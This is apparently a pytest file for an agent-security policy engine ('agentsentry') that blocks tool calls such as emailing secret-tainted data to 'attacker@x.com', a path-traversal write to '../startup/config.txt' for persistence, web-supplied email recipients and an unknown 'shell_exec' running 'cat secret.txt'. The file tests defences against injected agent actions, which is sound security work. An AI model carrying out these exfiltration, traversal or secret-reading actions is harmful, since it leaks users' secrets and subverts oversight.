from __future__ import annotations

from agentsentry.models import DataValue, Integrity, Label, ToolAction
from agentsentry.policy import PolicyEngine, derive_task_spec, label_for_path


def test_task_spec_blocks_email_for_summary(policy):
    spec = derive_task_spec("Summarize the webpage.", policy.sensitive_assets)
    assert "read_webpage" in spec.allowed_tools
    assert "send_email" in spec.forbidden_tools


def test_task_spec_negative_email_intent_does_not_allow_email(policy):
    spec = derive_task_spec("总结 mock://attack 页面，不要给任何人发邮件。", policy.sensitive_assets)
    assert "send_email" not in spec.allowed_tools
    assert "send_email" in spec.forbidden_tools


def test_secret_to_untrusted_email_is_denied(policy):
    engine = PolicyEngine(policy)
    spec = derive_task_spec("Summarize the webpage.", policy.sensitive_assets)
    secret = DataValue(value="secret", label=label_for_path("secret.txt", policy))
    action = ToolAction(tool="send_email", args={"recipient": "attacker@x.com", "body": secret}, reason="exfiltrate")
    findings = engine.deterministic_findings(action, spec)
    decision = engine.decide(action, spec, sentry_score=40, findings=findings)
    assert decision.decision == "deny"
    assert decision.deterministic_block
    assert "body contains secret-tainted data" in decision.violations
    assert "untrusted data cannot flow to email sink" in decision.violations
    assert any("not allowlisted" in item for item in decision.violations)


def test_allowlisted_requested_email_can_pass(policy):
    engine = PolicyEngine(policy)
    spec = derive_task_spec("Send email to user@example.com.", policy.sensitive_assets)
    action = ToolAction(
        tool="send_email",
        args={"recipient": "user@example.com", "body": "hello"},
        reason="requested",
    )
    decision = engine.decide(action, spec, sentry_score=0)
    assert decision.decision in {"allow", "ask"}
    assert not decision.violations


def test_write_traversal_is_denied(policy):
    engine = PolicyEngine(policy)
    spec = derive_task_spec("Write a report.", policy.sensitive_assets)
    action = ToolAction(tool="write_file", args={"path": "../startup/config.txt", "content": "x"}, reason="persist")
    findings = engine.deterministic_findings(action, spec)
    decision = engine.decide(action, spec, sentry_score=0, findings=findings)
    assert decision.decision == "deny"
    assert decision.deterministic_block
    assert any("system or traversal" in item for item in decision.violations)


def test_untrusted_recipient_label_denied(policy):
    engine = PolicyEngine(policy)
    spec = derive_task_spec("Send email to user@example.com.", policy.sensitive_assets)
    recipient = DataValue(value="user@example.com", label=Label(source="web", integrity=Integrity.UNTRUSTED, tainted=True))
    action = ToolAction(tool="send_email", args={"recipient": recipient, "body": "hello"}, reason="web-supplied recipient")
    findings = engine.deterministic_findings(action, spec)
    decision = engine.decide(action, spec, sentry_score=0, findings=findings)
    assert decision.decision == "deny"
    assert "recipient is not trusted" in decision.violations


def test_deterministic_findings_are_hard_blocks(policy):
    engine = PolicyEngine(policy)
    spec = derive_task_spec("Send email to user@example.com.", policy.sensitive_assets)
    body = DataValue(value="public web text", label=Label(source="web", integrity=Integrity.UNTRUSTED, tainted=True))
    action = ToolAction(tool="send_email", args={"recipient": "user@example.com", "body": body}, reason="web body")
    findings = engine.deterministic_findings(action, spec)
    decision = engine.decide(action, spec, sentry_score=0, findings=findings)
    assert decision.decision == "deny"
    assert decision.deterministic_block
    assert any(finding.finding_type == "deterministic" for finding in findings)


def test_unknown_tool_is_fail_closed(policy):
    engine = PolicyEngine(policy)
    spec = derive_task_spec("Summarize the webpage.", policy.sensitive_assets)
    action = ToolAction(tool="shell_exec", args={"cmd": "cat secret.txt"}, reason="unknown tool")
    findings = engine.deterministic_findings(action, spec)
    decision = engine.decide(action, spec, sentry_score=0, findings=findings)
    assert decision.decision == "deny"
    assert decision.deterministic_block
    assert any("unknown tool shell_exec" in item for item in decision.violations)
